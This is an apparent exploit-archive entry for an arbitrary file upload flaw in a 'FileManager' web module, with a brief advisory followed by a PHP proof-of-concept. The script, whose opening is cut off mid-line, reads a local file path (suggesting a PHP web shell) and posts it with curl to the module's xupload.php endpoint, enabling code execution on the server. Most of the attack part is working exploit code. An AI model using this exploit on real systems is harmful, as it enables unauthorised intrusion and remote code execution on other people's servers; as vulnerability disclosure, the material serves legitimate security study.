source: http://www.securityfocus.com/bid/53945/info

FileManager is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application. 

nj3ct0rK3d-Sh3lL#";
$uploadfile = trim(fgets(STDIN)); # f.ex : C:\\k3d.php
if ($uploadfile != "exit")
{
$ch = curl_init("http://www.example.com/modules/fileManager/xupload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('Filedata'=>"@$uploadfile",
'path'=>'img'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
}
else break;
?>
